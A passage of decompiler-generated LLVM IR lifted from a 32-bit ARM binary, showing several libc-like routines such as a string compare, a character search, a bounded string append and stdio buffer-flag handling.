  br label %dec_label_pc_1351c

dec_label_pc_13518:                               ; preds = %dec_label_pc_13490, %dec_label_pc_13488
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1351c

dec_label_pc_1351c:                               ; preds = %dec_label_pc_13500, %dec_label_pc_13508, %dec_label_pc_13518
  %v0_1351c = phi i32 [ %v0_13500, %dec_label_pc_13500 ], [ %v0_1351c.pre, %dec_label_pc_13508 ], [ -1, %dec_label_pc_13518 ]
  %v2_13520 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13520, i32* @r4, align 4
  ret i32 %v0_1351c

; uselistorder directives
  uselistorder i32 %v1_134e4, { 1, 0 }
  uselistorder i32 %v3_134e0, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i8 %tmp15, { 0, 2, 1 }
  uselistorder i32 %v4_13460, { 1, 0, 2 }
  uselistorder i32 %tmp, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1351c, { 2, 1, 0 }
  uselistorder label %.thread, { 4, 0, 2, 3, 1 }
}

define i32 @function_13524(i32 %arg1) local_unnamed_addr {
dec_label_pc_13524:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13524 = load i32, i32* @r4, align 4
  store i32 %v3_13524, i32* %stack_var_-8, align 4
  %v1_13528 = add i32 %arg1, 8
  %v1_1352c = inttoptr i32 %v1_13528 to i32*
  %v2_1352c = load i32, i32* %v1_1352c, align 4
  store i32 %v2_1352c, i32* @r1, align 4
  %v3_1352c = add i32 %arg1, 12
  %v4_1352c = inttoptr i32 %v3_1352c to i32*
  %v5_1352c = load i32, i32* %v4_1352c, align 4
  %v2_13530 = sub i32 %v5_1352c, %v2_1352c
  store i32 %v2_13530, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_13538 = inttoptr i32 %arg1 to i8*
  %v4_13538 = call i32 @function_133fc(i8* %v3_13538, i32 %v2_1352c, i32 %v2_13530)
  %v0_1353c = load i32, i32* @r4, align 4
  %v1_1353c = add i32 %v0_1353c, 8
  %v2_1353c = inttoptr i32 %v1_1353c to i32*
  %v3_1353c = load i32, i32* %v2_1353c, align 4
  store i32 %v3_1353c, i32* %r2.global-to-local, align 4
  %v2_13540 = add i32 %v3_1353c, %v4_13538
  %v2_13544 = add i32 %v0_1353c, 20
  %v3_13544 = inttoptr i32 %v2_13544 to i32*
  store i32 %v2_13540, i32* %v3_13544, align 4
  %v0_13548 = load i32, i32* %r2.global-to-local, align 4
  %v1_13548 = load i32, i32* @r4, align 4
  %v2_13548 = add i32 %v1_13548, 16
  %v3_13548 = inttoptr i32 %v2_13548 to i32*
  store i32 %v0_13548, i32* %v3_13548, align 4
  %v2_1354c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1354c, i32* @r4, align 4
  ret i32 %v4_13538

; uselistorder directives
  uselistorder i32 %v4_13538, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @function_133fc, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @function_13550() local_unnamed_addr {
dec_label_pc_13550:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_13550 = load i32, i32* @r4, align 4
  store i32 %v3_13550, i32* %stack_var_-12, align 4
  %v0_13554 = load i32, i32* @r0, align 4
  %v1_13554 = inttoptr i32 %v0_13554 to i8*
  %v2_13554 = load i8, i8* %v1_13554, align 1
  %v3_13554 = zext i8 %v2_13554 to i32
  store i32 %v3_13554, i32* %r2.global-to-local, align 4
  %v1_13558 = add i32 %v0_13554, 1
  %v2_13558 = inttoptr i32 %v1_13558 to i8*
  %v3_13558 = load i8, i8* %v2_13558, align 1
  %v4_13558 = zext i8 %v3_13558 to i32
  store i32 %v4_13558, i32* %r3.global-to-local, align 4
  %v4_1355c = mul nuw nsw i32 %v4_13558, 256
  %v5_1355c = or i32 %v4_1355c, %v3_13554
  store i32 %v5_1355c, i32* %r2.global-to-local, align 4
  %v1_13560 = load i32, i32* @r1, align 4
  %v2_13560 = and i32 %v1_13560, %v5_1355c
  %v4_13560 = icmp eq i32 %v2_13560, 0
  store i32 %v0_13554, i32* @r4, align 4
  br i1 %v4_13560, label %dec_label_pc_1356c, label %dec_label_pc_13584

dec_label_pc_1356c:                               ; preds = %dec_label_pc_13550
  %v1_1356c = and i32 %v5_1355c, 2176
  %v2_1356c = icmp eq i32 %v1_1356c, 0
  br i1 %v2_1356c, label %dec_label_pc_13574, label %dec_label_pc_13598

dec_label_pc_13574:                               ; preds = %dec_label_pc_1356c
  %v2_13574 = or i32 %v1_13560, %v5_1355c
  store i32 %v2_13574, i32* %r2.global-to-local, align 4
  %v3_13578 = sdiv i32 %v2_13574, 256
  store i32 %v3_13578, i32* %r3.global-to-local, align 4
  %v1_1357c = trunc i32 %v3_13578 to i8
  store i8 %v1_1357c, i8* %v2_13558, align 1
  %v0_13580 = load i32, i32* %r2.global-to-local, align 4
  %v1_13580 = trunc i32 %v0_13580 to i8
  %v2_13580 = load i32, i32* @r0, align 4
  %v3_13580 = inttoptr i32 %v2_13580 to i8*
  store i8 %v1_13580, i8* %v3_13580, align 1
  %v0_13584.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13584

dec_label_pc_13584:                               ; preds = %dec_label_pc_13550, %dec_label_pc_13574
  %v0_13584 = phi i32 [ %v0_13554, %dec_label_pc_13550 ], [ %v0_13584.pre, %dec_label_pc_13574 ]
  %v1_13584 = inttoptr i32 %v0_13584 to i8*
  %v2_13584 = load i8, i8* %v1_13584, align 1
  %v3_13584 = zext i8 %v2_13584 to i32
  store i32 %v3_13584, i32* %r2.global-to-local, align 4
  %v1_13588 = add i32 %v0_13584, 1
  %v2_13588 = inttoptr i32 %v1_13588 to i8*
  %v3_13588 = load i8, i8* %v2_13588, align 1
  %v4_13588 = zext i8 %v3_13588 to i32
  %v4_1358c = mul nuw nsw i32 %v4_13588, 256
  %v5_1358c = or i32 %v4_1358c, %v3_13584
  store i32 %v5_1358c, i32* %r3.global-to-local, align 4
  %v1_13590 = and i32 %v3_13584, 16
  store i32 %v1_13590, i32* %r5.global-to-local, align 4
  %v2_13590 = icmp eq i32 %v1_13590, 0
  br i1 %v2_13590, label %dec_label_pc_135c0, label %dec_label_pc_13598

dec_label_pc_13598:                               ; preds = %dec_label_pc_1356c, %dec_label_pc_13584
  %v0_13598 = call i32 @function_cc08()
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_135a0 = inttoptr i32 %v0_13598 to i32*
  store i32 9, i32* %v2_135a0, align 4
  br label %dec_label_pc_135a4

dec_label_pc_135a4:                               ; preds = %dec_label_pc_135c8, %dec_label_pc_13598
  %v0_135a4 = load i32, i32* @r4, align 4
  %v1_135a4 = inttoptr i32 %v0_135a4 to i32*
  %v2_135a4 = load i32, i32* %v1_135a4, align 4
  %v1_135a8 = or i32 %v2_135a4, 8
  store i32 %v1_135a8, i32* %r3.global-to-local, align 4
  %v3_135ac = sdiv i32 %v2_135a4, 256
  store i32 %v3_135ac, i32* %r2.global-to-local, align 4
  %v1_135b4 = trunc i32 %v3_135ac to i8
  %v3_135b4 = add i32 %v0_135a4, 1
  %v4_135b4 = inttoptr i32 %v3_135b4 to i8*
  store i8 %v1_135b4, i8* %v4_135b4, align 1
  %v0_135b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_135b8 = trunc i32 %v0_135b8 to i8
  %v2_135b8 = load i32, i32* @r4, align 4
  %v3_135b8 = inttoptr i32 %v2_135b8 to i8*
  store i8 %v1_135b8, i8* %v3_135b8, align 1
  %v2_135bc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_135bc, i32* @r4, align 4
  ret i32 -1

dec_label_pc_135c0:                               ; preds = %dec_label_pc_13584
  %v1_135c0 = and i32 %v3_13584, 64
  %v2_135c0 = icmp eq i32 %v1_135c0, 0
  br i1 %v2_135c0, label %dec_label_pc_135f0, label %dec_label_pc_135c8

dec_label_pc_135c8:                               ; preds = %dec_label_pc_135c0
  %v0_135c8 = call i32 @function_d60c()
  %v2_135cc = icmp eq i32 %v0_135c8, 0
  br i1 %v2_135cc, label %dec_label_pc_135d4, label %dec_label_pc_135a4

dec_label_pc_135d4:                               ; preds = %dec_label_pc_135c8
  %v0_135d4 = load i32, i32* @r4, align 4
  %v1_135d4 = inttoptr i32 %v0_135d4 to i32*
  %v2_135d4 = load i32, i32* %v1_135d4, align 4
  store i32 %v2_135d4, i32* %r3.global-to-local, align 4
  %v1_135d8 = add i32 %v0_135d4, 8
  %v2_135d8 = inttoptr i32 %v1_135d8 to i32*
  %v3_135d8 = load i32, i32* %v2_135d8, align 4
  store i32 %v3_135d8, i32* %r2.global-to-local, align 4
  %v1_135dc = and i32 %v2_135d4, -65
  store i32 %v1_135dc, i32* %r3.global-to-local, align 4
  %v3_135e0 = sdiv i32 %v2_135d4, 256
  store i32 %v3_135e0, i32* %r1.global-to-local, align 4
  %v2_135e4 = add i32 %v0_135d4, 28
  %v3_135e4 = inttoptr i32 %v2_135e4 to i32*
  store i32 %v3_135d8, i32* %v3_135e4, align 4
  %v0_135e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_135e8 = trunc i32 %v0_135e8 to i8
  %v2_135e8 = load i32, i32* @r4, align 4
  %v3_135e8 = add i32 %v2_135e8, 1
  %v4_135e8 = inttoptr i32 %v3_135e8 to i8*
  store i8 %v1_135e8, i8* %v4_135e8, align 1
  %v0_135ec = load i32, i32* %r3.global-to-local, align 4
  %v1_135ec = trunc i32 %v0_135ec to i8
  %v2_135ec = load i32, i32* @r4, align 4
  %v3_135ec = inttoptr i32 %v2_135ec to i8*
  store i8 %v1_135ec, i8* %v3_135ec, align 1
  %v0_135f0.pre = load i32, i32* @r4, align 4
  %v0_135fc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_135f0

dec_label_pc_135f0:                               ; preds = %dec_label_pc_135c0, %dec_label_pc_135d4
  %v0_135fc = phi i32 [ 0, %dec_label_pc_135c0 ], [ %v0_135fc.pre, %dec_label_pc_135d4 ]
  %v2_13600 = phi i32 [ %v0_13584, %dec_label_pc_135c0 ], [ %v0_135f0.pre, %dec_label_pc_135d4 ]
  %v1_135f0 = inttoptr i32 %v2_13600 to i32*
  %v2_135f0 = load i32, i32* %v1_135f0, align 4
  %v1_135f4 = or i32 %v2_135f0, 1
  store i32 %v1_135f4, i32* %r3.global-to-local, align 4
  %v3_135f8 = sdiv i32 %v2_135f0, 256
  store i32 %v3_135f8, i32* %r2.global-to-local, align 4
  %v1_13600 = trunc i32 %v3_135f8 to i8
  %v3_13600 = add i32 %v2_13600, 1
  %v4_13600 = inttoptr i32 %v3_13600 to i8*
  store i8 %v1_13600, i8* %v4_13600, align 1
  %v0_13604 = load i32, i32* %r3.global-to-local, align 4
  %v1_13604 = trunc i32 %v0_13604 to i8
  %v2_13604 = load i32, i32* @r4, align 4
  %v3_13604 = inttoptr i32 %v2_13604 to i8*
  store i8 %v1_13604, i8* %v3_13604, align 1
  %v2_13608 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13608, i32* @r4, align 4
  ret i32 %v0_135fc

; uselistorder directives
  uselistorder i32 %v3_135f8, { 1, 0 }
  uselistorder i32 %v3_135ac, { 1, 0 }
  uselistorder i32 %v3_13584, { 1, 2, 0, 3 }
  uselistorder i32 %v0_13584, { 0, 2, 1 }
  uselistorder i32 %v3_13578, { 1, 0 }
  uselistorder i32 %v5_1355c, { 0, 2, 1, 3 }
  uselistorder i32 ()* @function_d60c, { 1, 7, 6, 5, 4, 3, 2, 0 }
  uselistorder label %dec_label_pc_135f0, { 1, 0 }
  uselistorder label %dec_label_pc_13598, { 1, 0 }
  uselistorder label %dec_label_pc_13584, { 1, 0 }
}

define i32 @function_1360c(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1360c:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v3_13610 = load i32, i32* @r4, align 4
  %v6_13610 = load i32, i32* @lr, align 4
  %v1_13614 = add i32 %arg1, 4
  %v2_13614 = inttoptr i32 %v1_13614 to i32*
  %v3_13614 = load i32, i32* %v2_13614, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_1361c = load i32, i32* %arg2, align 4
  %v3_1361c = add i32 %tmp, 4
  %v4_1361c = inttoptr i32 %v3_1361c to i32*
  %v5_1361c = load i32, i32* %v4_1361c, align 4
  %v6_13620 = call i32 @function_14518(i32 %v3_13614, i32 %v2_1361c, i32 %v5_1361c, i32 %arg3, i32 %v3_13610, i32 %v6_13610)
  %v1_13624 = icmp slt i32 %v2_1361c, 0
  %v6_13620. = select i1 %v1_13624, i32 %v6_13620, i32 0
  store i32 %v6_13620., i32* %r3.global-to-local, align 4
  br i1 %v1_13624, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_1360c
  %v3_13630 = load i32, i32* @r4, align 4
  %v4_13630 = inttoptr i32 %v3_13630 to i32*
  store i32 %v6_13620, i32* %v4_13630, align 4
  %v6_13630 = add i32 %v3_13630, 4
  %v7_13630 = inttoptr i32 %v6_13630 to i32*
  store i32 %v2_1361c, i32* %v7_13630, align 4
  %v0_13634.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_1360c, %bb
  %v0_13634 = phi i32 [ %v6_13620, %dec_label_pc_1360c ], [ %v0_13634.pre, %bb ]
  ret i32 %v0_13634

; uselistorder directives
  uselistorder i32 %v6_13620, { 0, 2, 1 }
  uselistorder i32 %v2_1361c, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_13640(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_13644.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_13640

dec_label_pc_13640:                               ; preds = %bb3, %bb
  %v0_13644 = phi i32 [ %v0_13644.pre, %bb ], [ %v5_13644, %bb3 ]
  %v0_13640 = phi i32 [ %tmp, %bb ], [ %v5_13640, %bb3 ]
  %v1_13640 = inttoptr i32 %v0_13640 to i8*
  %v2_13640 = load i8, i8* %v1_13640, align 1
  %v1_13644 = inttoptr i32 %v0_13644 to i8*
  %v2_13644 = load i8, i8* %v1_13644, align 1
  %v3_13644 = zext i8 %v2_13644 to i32
  %v2_13648 = icmp eq i8 %v2_13640, 0
  br i1 %v2_13648, label %.dec_label_pc_13654_crit_edge, label %bb3

bb3:                                              ; preds = %dec_label_pc_13640
  %v5_13644 = add i32 %v0_13644, 1
  %v5_13640 = add i32 %v0_13640, 1
  %v3_13640 = zext i8 %v2_13640 to i32
  %v10_1364c = icmp eq i8 %v2_13640, %v2_13644
  br i1 %v10_1364c, label %dec_label_pc_13640, label %dec_label_pc_13654

.dec_label_pc_13654_crit_edge:                    ; preds = %dec_label_pc_13640
  br label %dec_label_pc_13654

dec_label_pc_13654:                               ; preds = %bb3, %.dec_label_pc_13654_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_13654_crit_edge ], [ %v3_13640, %bb3 ]
  %v2_13654.pre-phi = sub nsw i32 %.pn, %v3_13644
  ret i32 %v2_13654.pre-phi

; uselistorder directives
  uselistorder i8 %v2_13640, { 0, 2, 1 }
  uselistorder i32 %v0_13640, { 1, 0 }
  uselistorder i32 %v0_13644, { 1, 0 }
  uselistorder label %dec_label_pc_13654, { 1, 0 }
}

define i32 @function_13660(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13684:
  %v1_13664 = urem i32 %arg1, 256
  store i32 %v1_13664, i32* @lr, align 4
  %v4_13684 = mul nuw nsw i32 %v1_13664, 256
  %v5_13684 = or i32 %v4_13684, %v1_13664
  %v4_1368c = mul i32 %v5_13684, 65536
  %v5_1368c = or i32 %v4_1368c, %v5_13684
  %v0_13690.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_13690

dec_label_pc_13690:                               ; preds = %dec_label_pc_136fc, %dec_label_pc_13690, %dec_label_pc_13684
  %v0_13690 = phi i32 [ %v0_13690.pre, %dec_label_pc_13684 ], [ %v4_13690, %dec_label_pc_13690 ], [ %v4_13690, %dec_label_pc_136fc ]
  %v1_13690 = inttoptr i32 %v0_13690 to i32*
  %v2_13690 = load i32, i32* %v1_13690, align 4
  %v4_13690 = add i32 %v0_13690, 4
  store i32 %v4_13690, i32* @ip, align 4
  %v2_13698 = xor i32 %v2_13690, %v5_1368c
  %v2_1369c = add i32 %v2_13698, 2130640639
  %v1_136a4 = sub i32 -1, %v2_13698
  %v2_136a8 = xor i32 %v2_1369c, %v1_136a4
  %v2_136ac = and i32 %v2_136a8, -2130640640
  %v2_136b0 = icmp eq i32 %v2_136ac, 0
  br i1 %v2_136b0, label %dec_label_pc_13690, label %dec_label_pc_136b8

dec_label_pc_136b8:                               ; preds = %dec_label_pc_13690
  %v2_136b8 = inttoptr i32 %v0_13690 to i8*
  %v3_136b8 = load i8, i8* %v2_136b8, align 1
  %v4_136b8 = zext i8 %v3_136b8 to i32
  %v9_136c0 = icmp eq i32 %v4_136b8, %v1_13664
  store i1 %v9_136c0, i1* @cpsr_z, align 1
  %v1_136c4 = add i32 %v0_13690, 3
  %v1_136c8 = add i32 %v0_13690, 1
  store i32 %v1_136c8, i32* @r2, align 4
  %v1_136cc = add i32 %v0_13690, 2
  br i1 %v9_136c0, label %bb, label %bb18

bb:                                               ; preds = %dec_label_pc_136b8
  ret i32 %v0_13690

bb18:                                             ; preds = %dec_label_pc_136b8
  %v2_136d4 = inttoptr i32 %v1_136c8 to i8*
  %v3_136d4 = load i8, i8* %v2_136d4, align 1
  %v4_136d4 = zext i8 %v3_136d4 to i32
  %v9_136d8 = icmp eq i32 %v4_136d4, %v1_13664
  store i1 %v9_136d8, i1* @cpsr_z, align 1
  br i1 %v9_136d8, label %dec_label_pc_136e0, label %dec_label_pc_136e8

dec_label_pc_136e0:                               ; preds = %bb18
  ret i32 %v1_136c8

dec_label_pc_136e8:                               ; preds = %bb18
  %v2_136e8 = inttoptr i32 %v1_136cc to i8*
  %v3_136e8 = load i8, i8* %v2_136e8, align 1
  %v4_136e8 = zext i8 %v3_136e8 to i32
  %v9_136ec = icmp eq i32 %v4_136e8, %v1_13664
  store i1 %v9_136ec, i1* @cpsr_z, align 1
  br i1 %v9_136ec, label %dec_label_pc_136f4, label %dec_label_pc_136fc

dec_label_pc_136f4:                               ; preds = %dec_label_pc_136e8
  ret i32 %v1_136cc

dec_label_pc_136fc:                               ; preds = %dec_label_pc_136e8
  %v2_136fc = inttoptr i32 %v1_136c4 to i8*
  %v3_136fc = load i8, i8* %v2_136fc, align 1
  %v4_136fc = zext i8 %v3_136fc to i32
  %v9_13700 = icmp eq i32 %v4_136fc, %v1_13664
  store i1 %v9_13700, i1* @cpsr_z, align 1
  br i1 %v9_13700, label %dec_label_pc_13708, label %dec_label_pc_13690

dec_label_pc_13708:                               ; preds = %dec_label_pc_136fc
  ret i32 %v1_136c4

; uselistorder directives
  uselistorder i32 %v4_13690, { 2, 1, 0 }
  uselistorder i32 %v0_13690, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_13684, { 1, 0 }
  uselistorder i32 %v1_13664, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i1* @cpsr_z, { 7, 8, 9, 10, 1, 11, 12, 14, 15, 16, 17, 18, 19, 20, 2, 21, 22, 0, 3, 4, 5, 6, 13 }
}

define i32 @function_13718(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13718:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13718 = load i32, i32* @r4, align 4
  store i32 %v3_13718, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13724

dec_label_pc_13724:                               ; preds = %dec_label_pc_13724, %dec_label_pc_13718
  %v0_13724 = phi i32 [ %v5_13724, %dec_label_pc_13724 ], [ %tmp, %dec_label_pc_13718 ]
  %v1_13724 = inttoptr i32 %v0_13724 to i8*
  %v2_13724 = load i8, i8* %v1_13724, align 1
  %v3_13724 = zext i8 %v2_13724 to i32
  store i32 %v3_13724, i32* %ip.global-to-local, align 4
  %v5_13724 = add i32 %v0_13724, 1
  store i32 %v5_13724, i32* %r3.global-to-local, align 4
  %v2_13728 = icmp eq i8 %v2_13724, 0
  store i1 %v2_13728, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13728, label %dec_label_pc_13730, label %dec_label_pc_13724

dec_label_pc_13730:                               ; preds = %dec_label_pc_13724
  %v0_13730 = load i32, i32* %r2.global-to-local, align 4
  %v7_13730 = icmp eq i32 %v0_13730, 3
  store i1 %v7_13730, i1* %cpsr_z.global-to-local, align 1
  %v1_13734 = add i32 %v0_13724, -1
  store i32 %v1_13734, i32* %lr.global-to-local, align 4
  %tmp10 = icmp ult i32 %v0_13730, 4
  br i1 %tmp10, label %dec_label_pc_137c8thread-pre-split, label %dec_label_pc_1373c

dec_label_pc_1373c:                               ; preds = %dec_label_pc_13730
  %v3_1373c = udiv i32 %v0_13730, 4
  store i32 %v3_1373c, i32* %r0.global-to-local, align 4
  %v0_13740.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_13740

dec_label_pc_13740:                               ; preds = %dec_label_pc_137a0, %dec_label_pc_1373c
  %v2_13748 = phi i32 [ %v1_13798, %dec_label_pc_137a0 ], [ %v1_13734, %dec_label_pc_1373c ]
  %v0_13740 = phi i32 [ %v1_13794, %dec_label_pc_137a0 ], [ %v0_13740.pre, %dec_label_pc_1373c ]
  %v1_13740 = inttoptr i32 %v0_13740 to i8*
  %v2_13740 = load i8, i8* %v1_13740, align 1
  %v3_13740 = zext i8 %v2_13740 to i32
  store i32 %v3_13740, i32* %r3.global-to-local, align 4
  %v2_13744 = icmp eq i8 %v2_13740, 0
  store i1 %v2_13744, i1* %cpsr_z.global-to-local, align 1
  %v3_13748 = add i32 %v2_13748, 1
  %v4_13748 = inttoptr i32 %v3_13748 to i8*
  store i8 %v2_13740, i8* %v4_13748, align 1
  %v0_1374c = load i32, i32* %lr.global-to-local, align 4
  %v1_1374c = add i32 %v0_1374c, 1
  store i32 %v1_1374c, i32* %ip.global-to-local, align 4
  %v0_13750 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13750, label %.loopexit, label %dec_label_pc_13754

dec_label_pc_13754:                               ; preds = %dec_label_pc_13740
  %v0_13754 = load i32, i32* @r1, align 4
  %v1_13754 = add i32 %v0_13754, 1
  %v2_13754 = inttoptr i32 %v1_13754 to i8*
  %v3_13754 = load i8, i8* %v2_13754, align 1
  %v4_13754 = zext i8 %v3_13754 to i32
  store i32 %v4_13754, i32* %r3.global-to-local, align 4
  %v2_13758 = icmp eq i8 %v3_13754, 0
  store i1 %v2_13758, i1* %cpsr_z.global-to-local, align 1
  %v3_1375c = add i32 %v0_1374c, 2
  %v4_1375c = inttoptr i32 %v3_1375c to i8*
  store i8 %v3_13754, i8* %v4_1375c, align 1
  %v0_13760 = load i32, i32* @r1, align 4
  %v1_13760 = add i32 %v0_13760, 1
  store i32 %v1_13760, i32* %r1.global-to-local, align 4
  %v0_13764 = load i32, i32* %ip.global-to-local, align 4
  %v1_13764 = add i32 %v0_13764, 1
  store i32 %v1_13764, i32* %ip.global-to-local, align 4
  %v0_13768 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13768, label %.loopexit, label %dec_label_pc_1376c

dec_label_pc_1376c:                               ; preds = %dec_label_pc_13754
  %v1_1376c = add i32 %v0_13760, 2
  %v2_1376c = inttoptr i32 %v1_1376c to i8*
  %v3_1376c = load i8, i8* %v2_1376c, align 1
  %v4_1376c = zext i8 %v3_1376c to i32
  store i32 %v4_1376c, i32* %r3.global-to-local, align 4
  %v2_13770 = icmp eq i8 %v3_1376c, 0
  store i1 %v2_13770, i1* %cpsr_z.global-to-local, align 1
  %v3_13774 = add i32 %v0_13764, 2
  %v4_13774 = inttoptr i32 %v3_13774 to i8*
  store i8 %v3_1376c, i8* %v4_13774, align 1
  %v0_13778 = load i32, i32* %r1.global-to-local, align 4
  %v1_13778 = add i32 %v0_13778, 1
  store i32 %v1_13778, i32* %r1.global-to-local, align 4
  %v0_1377c = load i32, i32* %ip.global-to-local, align 4
  %v1_1377c = add i32 %v0_1377c, 1
  store i32 %v1_1377c, i32* %lr.global-to-local, align 4
  %v0_13780 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13780, label %.loopexit, label %dec_label_pc_13784

dec_label_pc_13784:                               ; preds = %dec_label_pc_1376c
  %v1_13784 = add i32 %v0_13778, 2
  %v2_13784 = inttoptr i32 %v1_13784 to i8*
  %v3_13784 = load i8, i8* %v2_13784, align 1
  %v4_13784 = zext i8 %v3_13784 to i32
  store i32 %v4_13784, i32* %ip.global-to-local, align 4
  store i32 %v1_13784, i32* %r3.global-to-local, align 4
  %v2_1378c = icmp eq i8 %v3_13784, 0
  store i1 %v2_1378c, i1* %cpsr_z.global-to-local, align 1
  %v3_13790 = add i32 %v0_1377c, 2
  %v4_13790 = inttoptr i32 %v3_13790 to i8*
  store i8 %v3_13784, i8* %v4_13790, align 1
  %v0_13794 = load i32, i32* %r3.global-to-local, align 4
  %v1_13794 = add i32 %v0_13794, 1
  store i32 %v1_13794, i32* @r1, align 4
  %v0_13798 = load i32, i32* %lr.global-to-local, align 4
  %v1_13798 = add i32 %v0_13798, 1
  store i32 %v1_13798, i32* %lr.global-to-local, align 4
  %v0_1379c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1379c, label %.loopexit, label %dec_label_pc_137a0

dec_label_pc_137a0:                               ; preds = %dec_label_pc_13784
  %v0_137a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_137a0 = add i32 %v0_137a0, -1
  store i32 %v1_137a0, i32* %r0.global-to-local, align 4
  %v7_137a0 = icmp eq i32 %v0_137a0, 1
  store i1 %v7_137a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_137a0, label %dec_label_pc_137a8, label %dec_label_pc_13740

dec_label_pc_137a8:                               ; preds = %dec_label_pc_137a0
  %v0_137a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_137a8 = urem i32 %v0_137a8, 4
  store i32 %v1_137a8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_137c8

dec_label_pc_137b0:                               ; preds = %dec_label_pc_137c8
  %v0_137b0 = load i32, i32* @r1, align 4
  %v1_137b0 = inttoptr i32 %v0_137b0 to i8*
  %v2_137b0 = load i8, i8* %v1_137b0, align 1
  %v3_137b0 = zext i8 %v2_137b0 to i32
  store i32 %v3_137b0, i32* %ip.global-to-local, align 4
  %v2_137b4 = icmp eq i8 %v2_137b0, 0
  store i1 %v2_137b4, i1* %cpsr_z.global-to-local, align 1
  %v1_137b8 = add i32 %v1_137d4, -1
  store i32 %v1_137b8, i32* %r2.global-to-local, align 4
  %v3_137bc = add i32 %v3_137d4, 1
  %v4_137bc = inttoptr i32 %v3_137bc to i8*
  store i8 %v2_137b0, i8* %v4_137bc, align 1
  %v5_137bc = load i32, i32* %lr.global-to-local, align 4
  %v6_137bc = add i32 %v5_137bc, 1
  store i32 %v6_137bc, i32* %lr.global-to-local, align 4
  %v0_137c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_137c0, label %.loopexit, label %dec_label_pc_137c4

dec_label_pc_137c4:                               ; preds = %dec_label_pc_137b0
  %v0_137c4 = load i32, i32* @r1, align 4
  %v1_137c4 = add i32 %v0_137c4, 1
  store i32 %v1_137c4, i32* @r1, align 4
  %v0_137c8.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_137c8thread-pre-split

dec_label_pc_137c8thread-pre-split:               ; preds = %dec_label_pc_137c4, %dec_label_pc_13730
  %v2_137bc6 = phi i32 [ %v6_137bc, %dec_label_pc_137c4 ], [ %v1_13734, %dec_label_pc_13730 ]
  %v0_137c8.pr = phi i32 [ %v0_137c8.pr.pre, %dec_label_pc_137c4 ], [ %v0_13730, %dec_label_pc_13730 ]
  br label %dec_label_pc_137c8

dec_label_pc_137c8:                               ; preds = %dec_label_pc_137c8thread-pre-split, %dec_label_pc_137a8
  %v3_137d4 = phi i32 [ %v2_137bc6, %dec_label_pc_137c8thread-pre-split ], [ %v1_13798, %dec_label_pc_137a8 ]
